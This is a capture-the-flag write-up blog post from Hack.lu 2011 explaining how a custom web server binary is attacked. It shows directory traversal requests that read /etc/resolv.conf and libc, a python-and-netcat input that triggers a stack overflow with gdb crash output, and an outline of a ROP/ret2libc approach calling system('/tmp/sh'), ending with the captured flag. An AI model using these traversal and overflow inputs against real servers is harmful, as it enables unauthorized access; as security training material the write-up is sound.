---
title: 'Hack.lu CTF 2011: Nebula Death Stick Services writeup'
author: longld
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:4:{s:5:"bitly";s:0:"";s:9:"permalink";s:87:"http://www.vnsecurity.net/2011/10/hack-lu-ctf-2011-nebula-death-stick-services-writeup/";s:7:"tinyurl";s:26:"http://tinyurl.com/64qrz5h";s:4:"isgd";s:19:"http://is.gd/lWicoe";}'
tweetbackscheck:
  - 1408358969
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
category:
  - 'CTF - CLGT Crew'
tags:
  - CLGT
  - CTF
  - Hack.lu
  - return-oriented-programming
  - rop
---
## Challenge Information

> Death Sticks are a totally illegal drug in the universe.  
> However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.  
> Seems like nobody has the power to stop them, so the Galactic&#8217;s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service&#8217;s server and search for any evidence on how to take them down!  
> May the force be with you.
> 
> http://ctf.hack.lu:2010/

## Analysis

*Thanks rd for helping Analysis part.*

Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (*http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf*). Together with &#8220;*./a.out*&#8221; from HTTP response header, I managed to download the binary via this request *http://ctf.hack.lu:2010/?page=../a.out*.

&#8220;*a.out*&#8221; binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.

[<img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" />][1]

**parse_params()** function basically looks &#8216;*?*&#8216; and &#8216;*=*&#8216; in order to parse the input query such as */?page=blah*, and then uses the different in length (**len**) to store parameter name and its value to the buffer on the stack of the caller function (**handle_connection()**). From above code, you can see that if we input in reverse order of &#8216;*?*&#8216; and &#8216;*=*&#8216; such as* /=blah?*, **len** value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.

> $ python2 -c &#8216;print &#8220;GET /=&#8221; + &#8220;A&#8221;*60 + &#8220;? HTTP/&#8221;&#8216;|nc -v localhost 2010  
> ..  
> (gdb) run  
> Starting program: /home/jail/ctf/hack.lu/o500/a.out  
> Notice: Nebulaserv &#8211; A Webserver for Nebulacorp
> 
> Notice: Starting up!
> 
> - Accepting requests on port 2010  
> [New process 4626]  
> - Got request with length 0: 127.0.0.1:35695 &#8211; GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/
> 
> - Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA< with value  
> - Opening ./nebula/index &#8211; 404 Not Found
> 
> Program received signal SIGSEGV, Segmentation fault.  
> [Switching to process 4626]  
> 0&#215;41414141 in ?? ()

## Exploit

The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as *system(&#8220;/tmp/sh&#8221;)*. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:

### Retrieve libc

In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span>

### Construct ROP payload

With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using &#8220;<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>&#8221; via *sprintf() &#8211; *which can perform byte-per-byte transfer the same as *strcpy() &#8211; *or &#8220;<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>&#8220;*. *

### The flag

The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.

<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver

total 24

-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out

-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD

drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula

-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh

$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD

Flag: R0PPINGy0urWAYinDUDE

</pre>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ ls -l /home/nebulaserver
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  total 24
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  Flag: R0PPINGy0urWAYinDUDE
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $
</div>

* *

 [1]: /wp/storage/uploads/2011/10/parse_params.jpg